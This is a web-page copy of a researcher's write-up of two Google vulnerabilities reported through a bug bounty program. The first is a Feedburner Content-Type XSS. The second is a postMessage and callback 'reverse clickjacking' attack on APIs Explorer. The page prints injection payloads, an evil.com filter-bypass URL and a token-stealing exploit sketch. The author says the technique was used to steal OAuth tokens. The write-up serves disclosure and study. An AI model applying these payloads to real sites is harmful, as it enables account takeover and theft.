<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Two stories about vulnerabilities in Google services</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Disclaimer: All research activities described in the article were carried out as part of the Vulnerability Reward Program. 

 History 1. On the small ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Two stories about vulnerabilities in Google services</h1><div class="post__text post__text-html js-mediator-article">  <b>Disclaimer:</b> All research activities described in the article were carried out as part of the Vulnerability Reward Program. <br><br><h4>  History 1. On the small Content Type that could </h4><br>  The vulnerability was in a service called Feedburner.  First, I created a feed and tried to embed the code into it.  But the page did not appear embedded data - only harmless links.  After several unsuccessful attempts, I found many posts on the PodMedic page.  PodMedic scans every link in the feed.  If a problem was discovered when creating an attachment, PodMedic gives the reason.  The messages said that the links are incorrect: the server is giving the wrong Content Type. <br><br> <a href="http://habrahabr.ru/company/pt/blog/210952/"><img src="https://habrastorage.org/getpro/habr/post_images/ac1/b4d/89e/ac1b4d89e1dcdb4a86a138f3d4de570e.png" alt="image"></a> 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Hm  Good.  I bet that the Content Type on this page is not filtered.  Simple server script: <br><br> <code>&lt;?php header('Content-Type: text/ <img src="http://z"> ; charset=UTF-8'); ?&gt;</code> <br> <br>  And we got what we wanted: <a name="habracut"></a><br><br><img src="https://habrastorage.org/getpro/habr/post_images/b39/50f/74f/b3950f74fb2d795f11f6756b96b06d46.png" alt="image"><br><br><h4>  Story 2. About a small callback that could </h4><br>  The vulnerability in Feedburner did not deliver - there was nothing remarkable about it.  Therefore, I immediately continued the search.  My attention was attracted by the APIs Explorer service on developers.google.com.  It is a tool that helps you interactively explore various Google programming interfaces.  With it, you can view the API and its versions, the available methods for each API, the supported parameters with accompanying documentation, and much more.  In fact, I was interested in a cross-domain interaction system based on postMessage.  The link to the researched Google API is set as follows: <br><br> <code><a href="https"></a> developers.google.com/apis-explorer/?base=https://webapis-discovery.appspot.com/_ah/api#p/</code> <br> <br>  The Base parameter is filtered by some regular expressions (in fact, it is poorly filtered), which are easily circumvented using the character% 23: <br><br> <code><a href="https"></a> developers.google.com/apis-explorer/?base=https://evil.com%23webapis-discovery.appspot.com/_ah/api#p/admin/reports_v1/</code> <br> <br>  As a result, an iframe is created with the src = evil.com parameter, waiting for a message from it.  Each message must contain two tokens.  The first token is contained in the window.name of the given iframe, the second is passed to location.hash.  I looked through which messages are being sent from <a href="https://webapis-discovery.appspot.com/_ah/api">webapis-discovery.appspot.com/_ah/api</a> , and wrote a page to send the same messages with valid tokens.  The page worked fine, and I tried to transfer some HTML data for implementation.  Unsuccessfully.  I could change the text, the location of the images, but this is not enough for XSS.  It was also possible to change the link to the documentation.  I managed to change it to <b>javascript: alert (document.domain)</b> : <br><br><img src="https://habrastorage.org/getpro/habr/post_images/f47/6a9/5a9/f476a95a96e7d90e817544a38e69cf94.png" alt="image"><br><br>  But this was not enough for me.  I did not like the fact that the operation requires action from the user.  Users never do what I want - in this case they will not click on the link :) Therefore, I used the page on developers.google.com with the Callback function (now almost all developers consider it safe).  I added a redirect to this page with a <b>callback</b> like <b>parent.links [0] .click</b> to my exploit after the link to the documentation was created using postMessage.  (The characters [] were filtered. In fact, the Callback was like this: <br><br> <code>document.body.lastElementChild.previousSibling.lastElementChild.firstElementChild.firstElementChild.lastElementChild.firstElementChild.firstElementChild.firstElementChild.nextSibling.)</code> <br> <br>  We try: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/f8c/e9e/13d/f8ce9e13da441b92ce3e129afa7a1f24.png" alt="image"><br><br>  Hooray!  Works fine and without user interaction.  So, the exploit looked something like this: <br><br> <code>token_1 = location.hash.split('rpctoken=')[1];</code> <br> <code>token_2 = window.name;</code> <br> <code>send_payload(data,token_1,token_2);</code> <br> <code>window.setTimeout('document.location=callback_url;',3000); //  -  -‚Ä¶</code> <br> <br>  And of course, I made a cool screenshot: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/a7b/217/a4c/a7b217a4c698ad1bc1e98f81e6bf1295.png" alt="image"><br><br>  I liked this method of operation.  I tried to use it in other services, and I managed to steal the user's OAuth token, buy any application on Google Play on his behalf using user billing information, and the purchased application was automatically installed on the user's device. <br><br>  The guys from the Google Security Team also liked this technique, and they <a href="">described</a> it on OWASP AppSec Eu, calling it Reverse Clickjacking. <br><br>  <b>Author</b> : Pavel Toporkov, Positive Research </div><p>Source: <a href="https://habr.com/ru/post/210952/">https://habr.com/ru/post/210952/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../210938/index.html">Dislocker Or find a common language with BitLocker in Linux Mint</a></li>
<li><a href="../210942/index.html">How I invent a method of simulating annealing</a></li>
<li><a href="../210946/index.html">Analyzing traffic sources to increase conversion</a></li>
<li><a href="../210948/index.html">Critical analysis of the games of the genre "hidden objects"</a></li>
<li><a href="../210950/index.html">Stresstest Apache and Nginx on EC2 MicroInstance</a></li>
<li><a href="../210954/index.html">Game developers troll creators Candy Crush</a></li>
<li><a href="../210956/index.html">Octodon: What should be a comfortable keyboard for smartphones</a></li>
<li><a href="../210958/index.html">Photo report of the construction process of the data center "DataPro Tver". Part II</a></li>
<li><a href="../210960/index.html">The story of a dog. Creating a character for the new game "Evolution: Battle for Utopia"</a></li>
<li><a href="../210964/index.html">Test flight of the Boeing 747-8F</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>